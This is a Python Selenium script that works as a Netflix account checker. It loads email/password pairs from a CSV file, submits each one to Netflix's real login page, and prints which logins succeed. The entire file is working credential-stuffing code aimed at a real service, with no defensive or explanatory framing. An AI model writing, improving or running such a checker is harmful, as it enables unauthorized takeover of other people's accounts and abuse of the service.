from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from models import Credential
import time
import random
import colorama
from colorama import Fore, Style
colorama.init()
creds = Credential.from_csv(file_name="netflix.csv")
firefox_binary = FirefoxBinary('C:\\Users\\abdul\\AppData\\Local\\Mozilla Firefox\\firefox.exe')

counter = 0
def logOut(driver):
    driver.get("https://www.netflix.com/SignOut")
    driver.get("https://www.netflix.com/login")
    return
try:
    for x in range(len(creds)):
        driver = webdriver.Firefox(firefox_binary=firefox_binary)
        driver.get("https://www.netflix.com/pk/login")
        for y in range(6):
            time.sleep(2)
            try:
                print(f"Trying email:{creds[counter].uname} password:{creds[counter].passwd}")

                email_field = driver.find_element_by_id("id_userLoginId")
                email_field.clear()
                email_field.send_keys(creds[counter].uname)

                password_field = driver.find_element_by_id("id_password")
                password_field.clear()
                password_field.send_keys(creds[counter].passwd)

                submit_button = driver.find_elements_by_class_name("login-button")
                submit_button[0].click()
                counter+=1
                time.sleep(10)
                check_login = driver.find_elements_by_class_name("list-profile")
                error = driver.find_elements_by_class_name("ui-message-error")
                if check_login == []:
                    print(Fore.RED+"FAIL"+Style.RESET_ALL)
                else:
                    print(Fore.GREEN+"SUCCESS"+Style.RESET_ALL)
                    # logOut(driver)
            except Exception as e:
                print(f"Error: {e}")
                
            time.sleep(1)
        driver.find_elements_by_xpath("/html/body/div[1]/div/div[3]/div/div/div[1]/h1")
        driver.close()
except KeyboardInterrupt:
    driver.close()